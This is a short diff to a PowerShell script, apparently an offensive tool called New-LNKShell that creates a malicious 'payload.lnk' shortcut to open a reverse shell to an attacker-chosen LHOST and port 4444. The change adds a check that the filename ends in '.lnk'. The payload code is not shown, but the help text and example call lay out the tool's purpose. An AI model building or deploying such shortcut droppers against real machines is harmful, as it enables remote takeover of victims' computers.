@@ -13,7 +13,7 @@ Target port on LHOST. Defaults to 4444.
 Target for created shortcut. Defaults to current directory.
 
 .PARAMETER Filename
-Target filename. Defaults to 'payload.lnk'.
+Target filename. Must end in lnk. Defaults to 'payload.lnk'.
 
 .EXAMPLE
 PS> New-LNKShell -LHOST 192.168.1.1 -LPORT 4444
@@ -28,6 +28,7 @@ Param (
     [Parameter(Mandatory = $True)]
     [string]
     $LHOST,
+    [ValidateScript({$_.Substring($_.length -4) -eq '.lnk'})]
     [string]
     $Filename = 'payload.lnk',
     [ValidateScript({Test-Path -Path $_})]
